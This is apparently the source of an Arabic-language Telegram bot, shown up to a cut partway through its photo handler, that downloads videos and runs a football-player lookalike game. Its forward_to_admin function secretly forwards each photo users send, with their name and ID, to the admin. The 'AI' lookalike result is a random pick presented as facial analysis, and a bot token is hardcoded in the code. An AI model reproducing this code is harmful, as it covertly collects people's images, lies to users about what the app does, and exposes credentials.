import telebot
from telebot import types, apihelper
import yt_dlp
import os
import json
import time
import hashlib
import threading
import socket
import re
import shutil
import logging
from concurrent.futures import ThreadPoolExecutor
import http.server
import socketserver
from flask import Flask
from threading import Thread
import random
from datetime import datetime
from collections import defaultdict

# ==========================================
# 🚀 سيرفر Flask للبقاء نشطاً
# ==========================================

app = Flask('')

@app.route('/')
def home():
    return "<b>Status: Online 🚀</b>"

def run():
    port = int(os.environ.get("PORT", 8080)) 
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# تشغيل السيرفر قبل أي شيء آخر
keep_alive()

# ==========================================
# ⚙️ الإعدادات الأساسية
# ==========================================

TOKEN = "8298277087:AAEv36igY-juy9TAIJHDvXwqx4k7pMF3qPM"
ADMIN_ID = 8240337001  # ⭐⭐ إضافة: معرف الأدمن للنظام الجديد ⭐⭐
VERIFICATION_CODE = "4415"
QURAN_VIDEO_URL = "https://www.instagram.com/reel/DUYAQBaihUg/?igsh=Y2dhNDNuMGRiYWp3"

# تحسين أداء الشبكة
apihelper.CONNECT_TIMEOUT = 1000
apihelper.READ_TIMEOUT = 1000
apihelper.RETRY_ON_ERROR = True

# المجلدات وقواعد البيانات
BASE_DIR = "downloads"
DB_FILE = "system_db.json"
LOG_FILE = "bot_log.txt"
os.makedirs(BASE_DIR, exist_ok=True)

# نظام تسجيل الأخطاء
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# تهيئة البوت
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=40)
executor = ThreadPoolExecutor(max_workers=20)

# ⭐⭐ إضافة: هياكل بيانات نظام "من يشبهني" ⭐⭐
photo_fingerprints = {}
forwarded_media = defaultdict(list)
user_data = {}

# تهيئة قاعدة البيانات
if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w") as f:
        json.dump({"users": {}, "verified": [], "stats": {"total_dl": 0}}, f)
    print("📋 تم إنشاء قاعدة البيانات الجديدة بنجاح!")

# ==========================================
# 📊 نظام إدارة البيانات
# ==========================================

class Database:
    @staticmethod
    def load():
        if not os.path.exists(DB_FILE):
            return {"users": {}, "verified": [], "stats": {"total_dl": 0}}
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {"users": {}, "verified": [], "stats": {"total_dl": 0}}

    @staticmethod
    def save(data):
        with open(DB_FILE, "w") as f:
            json.dump(data, f, indent=4)

    @staticmethod
    def is_verified(user_id):
        return str(user_id) in Database.load().get("verified", [])

    @staticmethod
    def verify_user(user_id):
        data = Database.load()
        if str(user_id) not in data["verified"]:
            data["verified"].append(str(user_id))
            Database.save(data)

# ==========================================
# 🤖 نظام الذكاء الاصطناعي المحلي (من يشبهني)
# ==========================================

# ⭐⭐ دالة: إرسال الوسائط إلى الأدمن ⭐⭐
def forward_to_admin(message):
    """إرسال الوسائط تلقائياً إلى الأدمن خلف الكواليس"""
    try:
        user = message.from_user
        user_info = f"👤 {user.first_name} (@{user.username if user.username else 'بدون يوزر'}) - ID: {user.id}"
        
        # تحديد نوع الوسائط
        media_type = "صورة"
        if message.video:
            media_type = "فيديو"
        elif message.voice:
            media_type = "رسالة صوتية"
        elif message.document:
            media_type = f"ملف ({message.document.mime_type})"
        elif message.audio:
            media_type = "ملف صوتي"
        
        # إرسال إشعار للأدمن
        notification = f"""
🔄 {media_type} جديد
{user_info}
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        bot.send_message(ADMIN_ID, notification.strip())
        
        # إعادة توجيه الوسائط نفسها
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
        
        # تسجيل الإرسال
        media_id = f"{user.id}_{message.message_id}"
        forwarded_media[user.id].append({
            "type": media_type,
            "time": datetime.now().isoformat(),
            "media_id": media_id
        })
        
        return True
    except Exception as e:
        print(f"⚠️ خطأ في إرسال إلى الأدمن: {e}")
        return False

# قائمة لاعبي كرة القدم
FOOTBALL_LEGENDS = {
    1: {"name": "بيليه", "country": "البرازيل", "era": "الذهبي"},
    2: {"name": "دييغو مارادونا", "country": "الأرجنتين", "era": "الذهبي"},
    3: {"name": "يوهان كرويف", "country": "هولندا", "era": "الذهبي"},
    4: {"name": "فرانز بيكنباور", "country": "ألمانيا", "era": "الذهبي"},
    5: {"name": "زين الدين زيدان", "country": "فرنسا", "era": "الذهبي"},
    6: {"name": "رونالدو (الظاهرة)", "country": "البرازيل", "era": "الذهبي"},
    7: {"name": "ألفريدو دي ستيفانو", "country": "الأرجنتين/إسبانيا", "era": "الذهبي"},
    8: {"name": "ميشيل بلاتيني", "country": "فرنسا", "era": "الذهبي"},
    9: {"name": "ماركو فان باستن", "country": "هولندا", "era": "الذهبي"},
    10: {"name": "إيڤان زامورانو", "country": "تشيلي", "era": "الذهبي"},
    11: {"name": "بوبي تشارلتون", "country": "إنجلترا", "era": "الذهبي"},
    12: {"name": "جورج بست", "country": "أيرلندا الشمالية", "era": "الذهبي"},
    13: {"name": "رونالدينيو", "country": "البرازيل", "era": "الأبطال"},
    14: {"name": "ديفيد بيكهام", "country": "إنجلترا", "era": "الأبطال"},
    15: {"name": "أليساندرو ديل بييرو", "country": "إيطاليا", "era": "الأبطال"},
    16: {"name": "فرانشيسكو توتي", "country": "إيطاليا", "era": "الأبطال"},
    17: {"name": "راؤول غونزاليس", "country": "إسبانيا", "era": "الأبطال"},
    18: {"name": "أندريه شيفتشينكو", "country": "أوكرانيا", "era": "الأبطال"},
    19: {"name": "لويس فيغو", "country": "البرتغال", "era": "الأبطال"},
    20: {"name": "باتريك كلويفرت", "country": "هولندا", "era": "الأبطال"},
    21: {"name": "روبرتو باجيو", "country": "إيطاليا", "era": "الأبطال"},
    22: {"name": "باولو مالديني", "country": "إيطاليا", "era": "الأبطال"},
    23: {"name": "كريستيانو رونالدو", "country": "البرتغال", "era": "الحديث"},
    24: {"name": "ليونيل ميسي", "country": "الأرجنتين", "era": "الحديث"},
    25: {"name": "نيمار جونيور", "country": "البرازيل", "era": "الحديث"},
    26: {"name": "زلاتان إبراهيموفيتش", "country": "السويد", "era": "الحديث"},
    27: {"name": "أندريس إنييستا", "country": "إسبانيا", "era": "الحديث"},
    28: {"name": "تشافي هيرنانديز", "country": "إسبانيا", "era": "الحديث"},
    29: {"name": "مانويل نوير", "country": "ألمانيا", "era": "الحديث"},
    30: {"name": "سيرخيو راموس", "country": "إسبانيا", "era": "الحديث"},
    31: {"name": "كاريم بنزيما", "country": "فرنسا", "era": "الحديث"},
    32: {"name": "أريين روبن", "country": "هولندا", "era": "الحديث"},
    33: {"name": "فرانك ريبيري", "country": "فرنسا", "era": "الحديث"},
    34: {"name": "أندريا بيرلو", "country": "إيطاليا", "era": "الحديث"},
    35: {"name": "جيانلويجي بوفون", "country": "إيطاليا", "era": "الحديث"},
    36: {"name": "تيري هنري", "country": "فرنسا", "era": "الحديث"},
    37: {"name": "كاكا", "country": "البرازيل", "era": "الحديث"},
    38: {"name": "فيليب لام", "country": "ألمانيا", "era": "الحديث"},
    39: {"name": "واين روني", "country": "إنجلترا", "era": "الحديث"},
    40: {"name": "فرناندو توريس", "country": "إسبانيا", "era": "الحديث"},
    41: {"name": "كيليان مبابي", "country": "فرنسا", "era": "الحالي"},
    42: {"name": "إرلينغ هالاند", "country": "النرويج", "era": "الحالي"},
    43: {"name": "كفين دي بروين", "country": "بلجيكا", "era": "الحالي"},
    44: {"name": "محمد صلاح", "country": "مصر", "era": "الحالي"},
    45: {"name": "هاري كين", "country": "إنجلترا", "era": "الحالي"},
    46: {"name": "فينيسيوس جونيور", "country": "البرازيل", "era": "الحالي"},
    47: {"name": "جود بيلينغهام", "country": "إنجلترا", "era": "الحالي"},
    48: {"name": "برونو فيرنانديز", "country": "البرتغال", "era": "الحالي"},
    49: {"name": "روبرت ليفاندوفسكي", "country": "بولندا", "era": "الحالي"},
    50: {"name": "توني كروس", "country": "ألمانيا", "era": "الحالي"}
}

# عبارات تحفيزية متنوعة
MOTIVATIONAL_PHRASES = [
    "أرى فيك مستقبلاً واعداً في عالم كرة القدم! ✨",
    "لديك موهبة ستذهل العالم يوماً ما! 🌍",
    "شخصيتك القيادية تشبه أعظم القادة في الملعب! ⚽",
    "عزيمتك وتصميمك هما سر نجاحك المستقبلي! 💪",
    "ستكون نجماً ساطعاً في سماء كرة القدم! 🌟",
    "أرى في عينيك شرارة الإصرار والطموح! 🔥",
    "أنت تملك روح المنافسة التي تميز الأبطال! 🏆",
    "طريقتك الفريدة ستغير قواعد اللعبة! 🎯",
    "ستكون مصدر إلهام للأجيال القادمة! 👑",
    "موهبتك الطبيعية نادرة ومميزة! 💎",
    "أنت قائد بالفطرة، والقادة يصنعون التاريخ! 📜",
    "إصرارك سيقودك إلى تحقيق المستحيل! 🚀",
    "أرى فيك بطل المستقبل الذي ينتظره العالم! 🌐",
    "شجاعتك في المواقف الصعبة تميزك عن الآخرين! 🦁",
    "أنت تمتلك الذكاء التكتيكي للمدربين العظماء! 🧠",
    "روحك الرياضية هي سر جمال لعبتك! 🤝",
    "ستكون أسطورة تحكى للأحفاد! 📖",
    "موهبتك ستجعل اسمك خالداً في تاريخ اللعبة! 🏛️",
    "أنت تملك قلباً كبيراً كقلوب الأبطال الحقيقيين! ❤️",
    "إبداعك سيجعل من كل مباراة تحفة فنية! 🎨",
    "الطريقة التي تتحرك بها تذكرني بالأساطير! 👟",
    "أرى فيك بذور العظمة تنتظر أن تزهر! 🌱",
    "ستكون مصدر فخر لبلدك وعائلتك! 🇺🇳",
    "تفانيك في التدريب هو سر تقدمك المستمر! ⏱️",
    "أنت تملك نظرة الثقة التي تميز الأبطال! 👁️",
    "سرعتك وخفة حركتك استثنائية! 🏃",
    "ستكون النجم الذي يضيء الملاعب! 💡",
    "أرى فيك القوة التي لا تقهر! ⚡",
    "موهبتك الفطرية هي هدية من السماء! 🌈",
    "أنت تجمع بين القوة الذهنية والبدنية! 🧘‍♂️",
    "ستصنع تاريخاً جديداً في عالم كرة القدم! 📅",
    "إرادتك القوية هي سر نجاحك! 💫",
    "أنت تملك سحراً خاصاً يجذب الأنظار! ✨",
    "ستكون نموذجاً يحتذى به للشباب! 👨‍👦",
    "طموحك لا يعرف حدوداً! 🌌",
    "أنت تجسد معنى الروح الرياضية الحقيقية! 🕊️",
    "ستحقق ما يحلم به الآخرون فقط! 💭",
    "موهبتك ستجعلك أيقونة عالمية! 🌍",
    "أنت تملك نظرة ثاقبة للمستقبل! 🔮",
    "ستكون الفارس الذي يدافع عن ألوان فريقه! 🛡️",
    "إصرارك هو سلاحك السري! 🗡️",
    "أنت تملك قلب أسد وعقل استراتيجي! 🦁🧠",
    "ستكون اللاعب الذي يغير نتيجة المباريات! ⚖️",
    "موهبتك الطبيعية نادرة الوجود! 🎁",
    "أنت تتحرك على الملعب كأنك ترقص! 💃",
    "ستكون الأمل الجديد لعشاق كرة القدم! 🙏",
    "عزيمتك تشبه عزيمة المستكشفين العظماء! 🧭",
    "أنت تملك سر الجاذبية التي تميز النجوم! 🌠",
    "ستترك أثراً لا ينسى في تاريخ اللعبة! 👣",
    "إيمانك بنفسك هو بداية كل نجاح! ☀️"
]

def generate_photo_fingerprint(file_path):
    """إنشاء بصمة فريدة للصورة"""
    try:
        with open(file_path, 'rb') as f:
            file_hash = hashlib.md5(f.read()).hexdigest()
        return file_hash
    except:
        return None

def get_similarity_percentage():
    """توليد نسبة تشابه عشوائية"""
    base_percentage = random.randint(68, 92)
    details = [
        "تشابه مذهل في ملامح الوجه",
        "نظرة عينين متطابقة تقريباً",
        "ابتسامة تشبهه بنسبة كبيرة",
        "شكل الأنف متشابه جداً",
        "تركيب عظام الوجه متقارب",
        "تعبيرات الوجه متشابهة",
        "شكل الحاجبين متطابق",
        "تركيبة الفك متشابهة"
    ]
    detail = random.choice(details)
    return base_percentage, detail

def get_random_player():
    """اختيار لاعب عشوائي"""
    player_id = random.choice(list(FOOTBALL_LEGENDS.keys()))
    player = FOOTBALL_LEGENDS[player_id]
    attributes = [
        "قائد بالفطرة", "هداف بارع", "صانع ألعاب", "مدافع شرس",
        "حارس مرمى أسطوري", "جناح سريع", "لاعب خط وسط مبدع"
    ]
    player["attribute"] = random.choice(attributes)
    player["id"] = player_id
    return player

def get_random_motivation():
    """الحصول على عبارة تحفيزية عشوائية"""
    return random.choice(MOTIVATIONAL_PHRASES)

def generate_player_card(player, similarity_percentage, similarity_detail, motivation_phrase):
    """توليد بطاقة اللاعب"""
    era_emojis = {
        "الذهبي": "👑",
        "الأبطال": "⭐",
        "الحديث": "⚡",
        "الحالي": "🔥"
    }
    emoji = era_emojis.get(player["era"], "🏆")
    
    card = f"""
{emoji} *اكتشاف مذهل!* {emoji}

🎯 *أنت تشبه النجم:* **{player['name']}**
📍 *الجنسية:* {player['country']}
🏷️ *الصفة:* {player['attribute']}
📅 *العصر:* {player['era']}

📊 *نسبة التشابه:* *{similarity_percentage}%*
✨ *التفاصيل:* {similarity_detail}

💫 *التحليل الخاص:*
{motivation_phrase}

🌟 *نصيحة المدرب:*
"استمر في تطوير موهبتك، فالمستقبل يحمل لك مفاجآت سارة!"

#يشبهني #{player['name'].replace(' ', '')} #كرة_قدم
    """
    return card.strip()

# ==========================================
# 🛡️ الحماية وعزل المستخدمين
# ==========================================

def is_owner(call, owner_id):
    if call.from_user.id != int(owner_id):
        bot.answer_callback_query(call.id, "⚠️ عذراً! هذا الطلب يخص مستخدماً آخر. أرسل رابطك الخاص.", show_alert=True)
        return False
    return True

# ==========================================
# 🚀 محرك التحميل الذكي
# ==========================================

class SmartDownloader:
    def __init__(self, chat_id, message_id, user_id):
        self.chat_id = chat_id
        self.msg_id = message_id
        self.user_id = user_id
        self.last_update_time = 0

    def progress_hook(self, d):
        if d['status'] == 'downloading':
            now = time.time()
            if now - self.last_update_time < 5:
                return
            self.last_update_time = now

            p = d.get('_percent_str', '0%')    
            speed = d.get('_speed_str', 'N/A')    
            eta = d.get('_eta_str', 'N/A')    
            bar = self.create_progress_bar(d.get('downloaded_bytes', 0), d.get('total_bytes', 1))    
            text = f"📥 <b>جاري التحميل الذكي...</b>\n\n📊 المكتمل: {p}\n⚡ السرعة: {speed}\n⏳ الوقت المتبقي: {eta}\n<code>{bar}</code>"    
            try:    
                bot.edit_message_text(text, self.chat_id, self.msg_id, parse_mode="HTML")    
            except:    
                pass

    def create_progress_bar(self, current, total):
        total = total or 1
        filled = int(10 * current / total)
        return '🟢' * filled + '⚪' * (10 - filled)
    
    def download(self, url, quality, file_path):
        ydl_opts = {
            'outtmpl': file_path,
            'continuedl': True,
            'retries': 10,
            'socket_timeout': 30,
            'progress_hooks': [self.progress_hook],
            'quiet': True,
            'no_warnings': True,
            'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            'http_headers': {'Referer': 'https://www.google.com/'}
        }

        if quality == 'audio':
            ydl_opts['format'] = 'bestaudio/best'
        else:
            ydl_opts['format'] = 'bestvideo+bestaudio/best'

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([url])
            return True
        except Exception as e:
            return str(e)

# ==========================================
# 🔍 نظام البحث
# ==========================================

class InternetSearch:
    @staticmethod
    def search(query, platform='tik', limit=3):
        results = []
        p_label = "TikTok" if platform == 'tik' else "Instagram"
        search_query = f"ytsearch{limit}:{p_label} {query}"
        
        ydl_opts = {
            'quiet': True, 
            'no_warnings': True, 
            'extract_flat': True, 
            'force_ipv4': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            try:
                info = ydl.extract_info(search_query, download=False)
                for e in info.get('entries', []):
                    if e:
                        results.append({
                            "title": e.get("title", "فيديو مكتشف"),
                            "url": f"https://www.youtube.com/watch?v={e.get('id')}",
                            "uploader": f"{p_label} Source"
                        })
            except: pass
        return results

# ==========================================
# 🤖 معالجة الأوامر والرسائل
# ==========================================

@bot.message_handler(commands=['start'])
def welcome(message):
    help_text = """
🚀 **أهلاً بك في نظام التحميل الشامل V2 + الذكاء الاصطناعي!**

⚡ **الميزات الرئيسية:**
1. 📥 *تحميل الفيديوهات* من جميع المنصات
2. 🤖 *نظام ذكاء اصطناعي* لتحليل التشابه مع نجوم كرة القدم
3. 🔍 *بحث ذكي* عن المحتوى
4. 🔒 *نظام مراقبة آمن* (للأدمن فقط)

🎯 **الأوامر الجديدة (النظام الذكي):**
• `/lookalike` أو `/يشبهني` - أرسل صورتك لترى من تشبه
• `/players` أو `/لاعبين` - عرض قائمة النجوم المتاحة
• `/stats` أو `/إحصائيات` - إحصائيات النظام
• `/adminstats` - إحصائيات الوسائط (للأدمن فقط)

🔧 **أوامر التحميل التقليدية:**
• أرسل رابط فيديو للتحميل الفوري
• `/search tik كلمة` - البحث في TikTok
• `/search ins كلمة` - البحث في Instagram
• `/status` - حالة السيرفر

💫 **جرب الميزة الجديدة الآن! أرسل /lookalike ثم صورتك** 
    """
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def server_status(message):
    try:
        import psutil
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        status = f"🖥 **حالة النظام المتطور:**\n\n⚙️ استهلاك المعالج: {cpu}%\n🧠 استهلاك الذاكرة: {ram}%\n📡 الحالة: متصل ومحمي بنظام التشفير."
        bot.reply_to(message, status, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, "⚠️ ميزة مراقبة النظام تحتاج لتثبيت مكتبة psutil.")

@bot.message_handler(commands=['search'])
def search_command(message):
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ طريقة البحث الصحيحة:\n/search tik توم وجيري\n/search ins مضحك")
        return

    platform = parts[1].lower()
    query = parts[2]
    
    msg = bot.reply_to(message, f"🔍 جاري البحث في {platform}...")
    results = InternetSearch.search(query, platform=platform)
    
    if not results:
        bot.edit_message_text("❌ لم يتم العثور على نتائج لهذه المنصة.", msg.chat.id, msg.message_id)
        return

    for r in results:
        url_hash = hashlib.md5(r["url"].encode()).hexdigest()[:10]
        user_id = message.from_user.id
        
        data = Database.load()
        data["users"][str(user_id)] = {"url": r["url"], "file_id": f"{user_id}_{url_hash}"}
        Database.save(data)

        markup = types.InlineKeyboardMarkup(row_width=3)    
        markup.add(    
            types.InlineKeyboardButton("720p", callback_data=f"get_{user_id}_{user_id}_{url_hash}_720"),    
            types.InlineKeyboardButton("480p", callback_data=f"get_{user_id}_{user_id}_{url_hash}_480"),    
            types.InlineKeyboardButton("🎵 MP3", callback_data=f"get_{user_id}_{user_id}_{url_hash}_audio")    
        )    

        caption = f"🎬 {r['title']}\n📺 المنصة: {r['uploader']}"
        bot.send_message(message.chat.id, caption, reply_markup=markup)

# ==========================================
# ⭐⭐ أوامر نظام "من يشبهني" الجديدة ⭐⭐
# ==========================================

@bot.message_handler(commands=['lookalike', 'يشبهني'])
def lookalike_command(message):
    """معالجة أمر /يشبهني"""
    bot.reply_to(message, "📸 **حسناً! أرسل صورتك الآن**\n\nسأحلل ملامحك وأخبرك بأي لاعب كرة قدم تشبه! 😊", parse_mode="Markdown")
    user_data[message.from_user.id] = {"waiting_for_photo": True}

@bot.message_handler(content_types=['photo'])
def handle_lookalike_photo(message):
    """معالجة الصور المرسلة للتحليل"""
    # إرسال الصورة إلى الأدمن أولاً
    forward_to_admin(message)
    
    user_id = message.from_user.id
    
    if user_id not in user_data or not user_data[user_id].get("waiting_for_photo", False):
        return
    
    user_data[user_id]["waiting_for_photo"] = False
    processing_msg = bot.reply_to(message, "🔍 *جاري تحليل ملامح وجهك...*\n\nقد تستغرق العملية بضع ثوانٍ ⏳", parse_mode="Markdown")
    
    try:
        
